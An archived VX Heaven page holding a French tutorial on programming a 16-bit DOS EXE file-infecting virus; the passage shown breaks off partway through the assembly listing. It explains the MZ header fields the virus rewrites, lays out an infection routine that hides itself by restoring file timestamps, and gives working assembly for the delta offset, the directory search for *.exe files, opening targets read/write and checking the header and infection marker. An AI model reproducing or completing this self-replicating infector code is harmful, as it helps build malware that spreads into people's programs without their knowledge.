<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> rikenar 'Infecteur d'exe 16 bits' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="rikenar"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, rikenar,Infecteur d'exe 16 bits, bytes, word, header, buffer, movsw, prog, delta, initial, pages, close, page, paragraphes, fichier, vous, taille"/>
<meta name="Description" content="Voici donc le premier article d'une série, je l'espère où nous allons voir le fonctionnement et la programmation d'infecteur de fichiers exécutables fonctionnant sous environnement win32 ou dos. Dans cette première partie, nous allons nous intéresser plus particulièrement au fichier 16 bits. Notre but étant de créer un exécutable qui pourra se reproduire dans tous les fichiers présent dans le répertoire. Si vous souhaitez vous renseigner un peu plus sur ce sujet, je peux vous conseiller quelques articles qui sont assez intéressant, qui se trouve dans le zine de Tipiax, dans rtc et dans le mag de ioc. Je vous conseille aussi les 2 guides de Billy Belcebu en anglais qui sont indispensables si vous souhaitez vous mettre assez sérieusement aux infecteur.Pour ce qui est du langage utilisé, on va bien sûr coder en 100% asm, je vous recommende donc de vous procurer un table de toutes les interruptions, il faut aussi que vous ayez un minimum de base dans ce langage pour pouvoir suivre correctement. Aussi dans ce premier article, je ne parlerai que des fichiers exe 16 bits qui fonctionnent sous dos, ce sujet ne traitera en aucun cas des exécutables qui appartiennent à un environnement win32. Nous pouvons commencer."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"f568b59ae2ca5271b5e7aee9bae99cd38488af7a-1498757793-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vri00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Infecteur d'exe 16 bits</h1><p><a href="/lib/?lang=fr&amp;author=rikenar"> rikenar</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vri00.html';</script>[<a style="" href="/lib/?lang=FR&amp;index=DO#vri00">Back to index</a>] [<a href="/lib/vri00.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">1. Introduction</a></li>
<li><a href="#c2">2. Programmation</a>
<ul>
<li><a href="#c21">A. Mode de fonctionnement du virus</a></li>
<li><a href="#c22">B. Caractéristiques des fichiers 16 bits (l'header et autres)</a></li>
<li><a href="#c23">C. Programmation étapes par étapes</a>
<ul>
<li><a href="#c231">1. Déroulement de l'infection</a></li>
<li><a href="#c232">2. Programmation</a></li>
</ul></li>
</ul></li>
<li><a href="#c3">3. Code source</a></li>
<li><a href="#c4">4. Conclusion</a></li>
</ul>
<h2><a name="c1"></a>1. Introduction</h2>
<p>Voici donc le premier article d'une série, je l'espère où nous allons voir le fonctionnement et la programmation d'infecteur de fichiers exécutables fonctionnant sous environnement win32 ou dos. Dans cette première partie, nous allons nous intéresser plus particulièrement au fichier 16 bits. Notre but étant de créer un exécutable qui pourra se reproduire dans tous les fichiers présent dans le répertoire. Si vous souhaitez vous renseigner un peu plus sur ce sujet, je peux vous conseiller quelques articles qui sont assez intéressant, qui se trouve dans le zine de Tipiax, dans rtc et dans le mag de ioc. Je vous conseille aussi les 2 guides de Billy Belcebu en anglais qui sont indispensables si vous souhaitez vous mettre assez sérieusement aux infecteur.</p>
<p>Pour ce qui est du langage utilisé, on va bien sûr coder en 100% asm, je vous recommende donc de vous procurer un table de toutes les interruptions, il faut aussi que vous ayez un minimum de base dans ce langage pour pouvoir suivre correctement. Aussi dans ce premier article, je ne parlerai que des fichiers exe 16 bits qui fonctionnent sous dos, ce sujet ne traitera en aucun cas des exécutables qui appartiennent à un environnement win32. Nous pouvons commencer.</p>
<h2><a name="c2"></a>2. Programmation</h2>
<h3><a name="c21"></a>A. Mode de fonctionnement du virus</h3>
<p>Avant de commencer, je vais expliquer ce que devra faire le programme que nous allons coder. Un infecteur, généralement doit essayer de se copier son code à la fin de tous les fichiers (pour nous ce sera ceux du répertoire) sans que l' utilisateur lambda ne s'en apercoive, mais aussi sans que le programme hôte ne soit altéré. Donc après, l'infection tous les programmes doivent fonctionner comme auparavant mais avec un petit changement qui est d' executer le code du virus en 1er avant de redonner la main au programme hôte. Je vais faire un exemple tout simple pour mieux comprendre:</p>
<ul>
<li>nous avons 2 programmes: infecteur.exe et prog1.exe qui fonctionnent normalement tous les 2.</li>
<li>lorsque j'execute infecteur.exe, celui se greffe à la fin de prog1.exe sans que l'on s'en aprecoivent.</li>
<li>prog1.exe est désormais infecté.</li>
<li>je rajoute prog2.exe dans le meme répertoire.</li>
<li>il y a donc 3 fichiers maintenant: (I) -> veut dire infecté
<ul>
<li>infecteur.exe(I)</li>
<li>prog1.exe(I)</li>
<li>prog2.exe</li>
</ul>
<p>Le fichier que nous avons rajouté est donc sain.</p></li>
<li>en éxécutant, prog1.exe, celui ci doit donc lire le code que nous lui avons greffer, c'est à dire celui de infecteur.exe et doit donc infecter prog2.exe</li>
<li>à la fin, nos 3 fichiers sont infectés sans que l'on s'en soit aperçu.</li>
</ul>
<p>Et c'est là, que je veux préciser quelquechose à ceux qui lisent ces lignes, c'est à dire à ceux qui débutent dans le monde des virus, il faut que vous compreniez que l' interet du virus n'est pas celui que la plupart des gens pensent, c'est à dire de détruire les données et de crasher l' ordinateur, il ne faut pas croire tout ce qu'on entend et tout ce que disent ces compagnies d' antivirus qui ne cherchent comme toujours qu' à se faire de l' argent. Le but d'un virus est d'essayer de se reproduire le plus possible dans les fichiers qui lui sont offert, donc si vous avez lu ces lignes dans l' espoir de trouver un moyen de planter l'ordinateur de qqun pour je ne sais quels raisons, vous pouvez vite arrêter de lire.</p>
<p>Nous voilà donc reparti, le but de notre programme va être:</p>
<ul>
<li>d'aller s' écrire à la fin d'un fichier.</li>
<li>de modifier certains champs du fichier pour permettre au code du virus d'être éxécuté en 1er lorsque l'on lancera le programme infecté.</li>
<li>et de redonner la main au fichier hôte pour que cela paraisse le plus transparant possible. Bien sûr, cette algorithme est simplifié au maximum mais le principe est là.</li>
</ul>
<h3><a name="c22"></a>B. Caractéristiques des fichiers 16 bits (l'header et autres)</h3>
<p>Dans chaque fichiers exe 16 bits, on peut aprecevoir au début de ceux ci une en-tête(ou header) qui est nécessaire au bon fonctionnement du fichier. Pour que notre virus fonctionne correctement, il va falloir que vous compreniez bien les différents champs de l' header, en effet l' ajout de notre virus à la fin de celui ci va modifier certains champs de cette en-tête. Voyons voir maintenant, un descriptif de cette header:</p>
<table summary="header" border="1">
<tr><th>Offset </th><th>Nom</th><th>Description</th></tr>
<tr><td>-> 00h</td><td>Exe mask</td><td>Champs qui ns dit si l'on est ds un exe = MZ</td></tr>
<tr><td>-> 02h (b)</td><td>Taille de la dernière page</td><td>Taille de la dernière pages en bytes</td></tr>
<tr><td>-> 04h (P)</td><td>Nb total de pages</td><td>Nb total de pages(= 512 bytes)qu'occupe le fichier</td></tr>
<tr><td>06h</td><td>Relocations</td><td>Nb d' entrées dans la table de relocation</td></tr>
<tr><td>-> 08h (p)</td><td>Taille de l'header</td><td>Taille de l'en tête en paragraphe(= 16 bytes).</td></tr>
<tr><td>0ah (p)</td><td>Allocation mini</td><td>Mémoire minimum requise (en paragraphes)</td></tr>
<tr><td>0ch (p)</td><td>Allocation maxi</td><td>Mémoire maximum requise (en paragraphes)</td></tr>
<tr><td>-> 0eh (p)</td><td>Prerelocation SS</td><td>Offset initial de SS depuis l' header</td></tr>
<tr><td>-> 10h (b)</td><td>Stack pointer initial</td><td>Offset initial de SP depuis SS</td></tr>
<tr><td>-> 12h</td><td>Checksum</td><td>Intéressant pour placer la marque d' infection</td></tr>
<tr><td>-> 14h (b)</td><td>Ip initial</td><td>1er Ip à exécuter</td></tr>
<tr><td>-> 16h (p)</td><td>Cs initial</td><td>Cs initial du programme</td></tr>
<tr><td>18h</td><td>Adresse table relocation</td><td>Offset de la table de relocation depuis le fichier</td></tr>
<tr><td>1ah</td><td>Overlay number</td><td>Rien d' intéressant</td></tr>
<tr><td>1ch</td><td>Reserve</td><td>&nbsp;</td></tr>
</table>
<p>Les champs intéressants sont marqués d'un '->'. Aussi pour mieux comprendre, dans la colonne offset:</p>
<ul>
<li>(b) signifie que les données sont exprimées en bytes.</li>
<li>(p) signifie que les données sont en paragraphes: 1 paragraphes = 16 bytes.</li>
<li>(P) signifie que les données sont exprimées en pages: 1 pages = 512 bytes.</li>
</ul>
<p>Il faut que vous compreniez cette en-tête pour ensuite bien connaitre le fonctionnement du virus, en effet là on joue plus avec les com, ici l'ajout du virus va devoir nous faire modifier qq données de l'en-tête pour que le fichier sain puisse refonctionner correctement une fois infecté. Je vais expliquer plus en détails désormais les champs que j'ai marqués comme étant important, car ceux là vont être modifié par l'ajout du virus à la fin du fichier, vous verrez que si vous avez quelques bases en assembleur, vous comprendrez assez facilement:</p>
<dl>
<dt>Exe mask (offset 00)</dt><dd>c'est ici que l'on va pouvoir tester si le fichier que l'on veut infecter est bien un exe. Si c'en est un, on trouve à cette offset de l' header le marquage:MZ, cela nous servira lorque l'infecteur voudra vérifier le fichier à infecter.</dd>
<dt>Taille de la dernière page (offset 02) et Nb total de pages (offset 04)</dt><dd>il faut savoir que avec les exe 16 bits, leur taille peut etre donné par les champs 02 et 04 de l'header. A l'offset 04, on trouve le nombre total de pages(qui est égal à 512 bytes) que le fichier posséde, et l'offset 02 la taille en bytes de la dernière page. Je vais faire un exemple pour vous expliquer, ce sera plus facile:
<p>Metons qu'on est un fichier qui fait 600 bytes, alors on aura à l'offset 04 le nb de pages de 512 bytes, c'est à dire 2 pour ce cas là. Et à l'offset 02, on aura la taille en bytes de la dernière page, c'est à dire 88. Si l'on veut retrouver la taille du fichier, on a qu'à faire: (2 - 1) * 512 + 88 = 600 bytes. Voilà pour ce qui est de ces adresses.</p></dd>
<dt>Taille de l'header (offset 08)</dt><dd>Ce champs calculé en paragraphes désigne la taille que répresente l' en-tête du fichier, on ne modifiera rien à cette adresse mais cela nous servira lorsqu'on voudra faire pointer la première instruction du programme (après infection) sur le code du virus.</dd>
<dt>Prerelocation SS (offset 0e)</dt><dd>Ici, on trouve le déplacement qu'il faut effectuer à partir de la fin de l'header pour atteindre la stack segment (SS), cette valeur est aussi calculé en paragraphes.</dd>
<dt>Stack pointer initial (offset 10)</dt><dd>On trouve ici, encore le déplacement relatif qu'il y a du stack segment au stack pointer. Nous modifierons ce champs est pour éviter que le données et le code viennent écraser la pile, il faut choisir à cette endroit une valeur assez grande.</dd>
<dt>Checksum</dt><dd>Ce champs n'a pas une utilité primordiale, et nous servira à marquer notre signature suite à l'infection, ce qui nous permettra de ne pas infecter un fichier qui l'est déja.</dd>
<dt>Ip initial (offset 14) et Cs initial (offset 16)</dt><dd>ces deux champs sont très important car il contiennent à eux 2, la première instruction qui va être éxécuté par le programme qui sera de la forme Cs(initial) : Ip(initial) et qui bien entendu devra pointer sur notre virus. Pour être plus précis, les valeurs sont calculé à partir de la fin de l'header du programme.</dd>
</dl>
<p>Voilà pour ce qui est de principaux champs de l'header qui sont utiles pour que l'infection soit réussi. Si vous n'avez pas tout compris (parce que c'est mal expliqué :)), ne vous en faites pas, ce sera reexpliqué lors du moment où on parlera un peu plus programmation et vous verrez que dès que vous aurait bien compris le fonctionnement de l'header, le code sera très facile à comprendre.</p>
<h3><a name="c23"></a>C. Programmation étapes par étapes</h3>
<h4><a name="c231"></a>1. Déroulement de l'infection</h4>
<p>Bon, ca y est, on va commencer à parler un peu plus pratique et on va pouvoir passer au côté programmation. Mais avant, on va détailler toutes les étapes qu'il va falloir pour que l'infecteur fonctionne parfaitement. Et c'est là que vous devait tout bien comprendre, en effet si vous avez compris parfaitement le processus d'infection de notre virus, et que vous avez de bonnes bases en asm, le code deviendra alors assez facile. Parce que je peux vous dire que si moi, j'y suis arrivé, tout le monde le peut si il se donne la peine de réfléchir.</p>
<p>Passons à l'algorithme de notre programme maintenant.</p>
<ol>
<li>On calcule en premier le delta offset qui est le décalage que le virus à provoqué après s'être écrit dans le fichier.</li>
<li>Tout d'abord, on ouvre le fichier à l'aide de la table Dta et on ouvre que les fichiers qui portent l'extension *.exe.</li>
<li>On sauvegarde l'heure de dernière modification du fichier hôte.</li>
<li>On vérifie qu'il s'agit bien d'un fichier exe par l'intermédiaire du premier champs de l'header du fichier (MZ).</li>
<li>On teste si le fichier à déjà était infecté à l'aide de la signature que nous aurions écrits à l'offset 12 de l'header.</li>
<li>On garde en mémoire les champs les plus importants de l'header qui vont nous servir, c'est à dire les champs aux offsets 0eh, 10h, 14h et 16h.</li>
<li>On se place à la fin du fichier.</li>
<li>On calcule les nouveaux champs de l'header et plus particulièrement ceux aux offsets 14 et 16 qui devront bien naturellement pointé sur le premiére instruction de notre virus qui a été copié dans le fichier.</li>
<li>On recalcule la nouvelle taille du fichier après infection et on place les nouvelles valeurs aux adresses 02 et 04 de l'header du fichier.</li>
<li>On écrit le virus à la fin du fichier.</li>
<li>On se place au début et on écrit la nouvelle en-tête.</li>
<li>On restaure la dernière date de modification que l'avait sauvegarder plus haut.</li>
<li>Et enfin on rend la main au fichier hôte sans que l'utilisateur ne s'aprecoivent de quelquechose.</li>
</ol>
<p>Je vais détailler chaque étapes le plus possible en essayant de ne pas omettre de détails.</p>
<h4><a name="c232"></a>2. Programmation</h4>
<p>On va commencer par ce qui est caractéristiques de tous les virus qu'ils fonctionnent sous dos ou sous windows, je parle donc ici du delta offset. On pourrait le définir comme étant le décalage que le virus à crée en allant s'écrire à la fin du fichier. Et voilà le code illustrant cette partie:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">debut<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; delta &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; &lt;-l'offset de delta est pushé sur la pile</span><br/>
delta<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; &lt;-pop bp permet de récupérer dans bp, ip</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; qui a été pushé à cause du call</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span> offset delta&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; &lt;-on enleve à bp, l'offset de delta qui</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; a été trouvé lors de la compilation &nbsp; &nbsp; </span><br/>
&nbsp;</div>
<p>Voyons voir un exemple, vous verrez que cela deviendra beaucoup plus facile aprés, ici le 1er cas représente le virus lui même et le 2ème nous montre un fichier après infection.</p>
<pre class="source">
               Virus                               Fichier infecté

111C:0106   call 0109   -> ip = 109.        112D:0200   call 0203   -> ip = 0203.
111C:0109   pop bp      -> bp = 109.        112D:0203   pop bp      -> bp = 0203. 
111C:010A   sub bp, 109 -> bp = 0.          112D:0204   sub bp, 109 -> bp = 203h - 109h = FA.
</pre>
<p>On voit donc assez bien que dans le virus, bp c'est à dire le delta offset est nul ce qui est normal vu que le virus est l'infecteur d'origine. En revanche dans le fichier infecté, le delta offset est 'FA', qui est donc le décalage qui nous servira tant par la suite et qui représente le déplacement par rapport au fichier. Ce mécanisme du delta offset existe dans tous les virus je crois.</p>
<p>Ensuite, après avoir calculer le delta offset, nous allons devoir restaurer l'ancien Ip placé dans ip_old pour le mettre dans ip_new, on effectue cela par l'aide movsw qui copie la chaine qui est dans si (source index) dans di (destination index)</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">ip<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>ip_new <span style="color: #339933;">+</span> <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>ip_old <span style="color: #339933;">+</span> <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
&nbsp;</div>
<p>Maintenant, il faut définir une nouvelle adresse de la table dta qui va nous permettre de pouvoir lister tous les fichiers du répertoire avant de les infecter, pour cela on utilise la fonction 1ah de l'interruption 21h. Il faut savoir que dans la table Dta, il y a beaucoup de paramètres qui sont très utiles pour l'infection d'un fichier. Parmi les principaux champs, on trouve à l'offset 1eh le nom du fichier. Donc pour modifier l'adresse de la nouvelle dta, il faut:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">mtda<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1ah</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> offset new_dta<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4eh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> exe_mask<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; exe_mask -&gt; *.exe</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; cx = 0.</span><br/>
search<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jc</span>&nbsp; &nbsp; &nbsp; end<br/>
&nbsp;</div>
<p>On va ainsi modifier l'adresse de la nouvelle Dta avec ce qui se trouve à l'adresse de new_dta. Après, on va lire avec la fonction 4eh la première entrée du répertoire qui aura un nom de fichier de type: *.exe, c'est à dire on va lire tous les fichiers exe. On appelle l'interruption et si il y a un problème, on se casse.</p>
<p>Seulement, ensuite on va pouvoir ouvrir le fichier, on pourra donc effectuer des changements dessus. Pour cela rien de difficile, voici la syntaxe de la fonction que l'on va utiliser:</p>
<pre class="source">
Fonction 3d:
Permet d'ouvrir un fichier existant.

ah ->	3dh
al ->	on place ici le mode d'accés
	ici 02 permet au fichier d' être lu et écrit.
dx ->	offset du nom du fichier à ouvrir.
Et en retour de l'execution de la fonction, on choppe en ax l'handle du
fichier qui nous servira pour tout le reste du code, lorsqu'on voudra
effectuer des opérations sur un fichier.
</pre>
<p>Ce qui donne:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3dh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">02h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>new_dta<span style="color: #339933;">+</span><span style="color: #ff0000;">1eh</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">; à l'offset 1eh de la table dta, on a le nom du fichier</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">5700h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on lit la date de dernière modification du fichier</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on sauvegarde pour faire plus discret</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span> <br/>
&nbsp;</div>
<p>Voilà, jusque ici rien de bien compliqué. Mais maintenant, nous allons attaquer à l'header du fichier, à la sauvegarde de celui ci, mais aussi à la modification. Pour cela nous allons, nous allons lire les premiers 1ah octets de l'header à l'aide la fonction 3fh. Nous allons aussi vérifier que nous avons bien sous les mains un fichier exe en comparant le premier champs de l'entête à 'ZM', on vérifie aussi que la fichier n'a pas déja été infecté, et ceci grâce à la signature que l'on aura écrite à l'offset 12h de l'header.</p>
<pre class="source">
Fonction 3f:
Cette fonction permet de lire un nombre défini de caractères dans un fichier
que l'on vient d'ouvrir.

ax -> 3fh
bx -> handle du fichier
cx -> nombre d'octets à lire
dx -> offset du buffer où l'on va placer les caractères lus.
</pre>
<p>Et voici le code.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3fh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1ah</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; lit les 1ah premiers caractères de l'header</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> offset buffer_header<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; les place dans buffer_header</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'ZM'</span><br/>
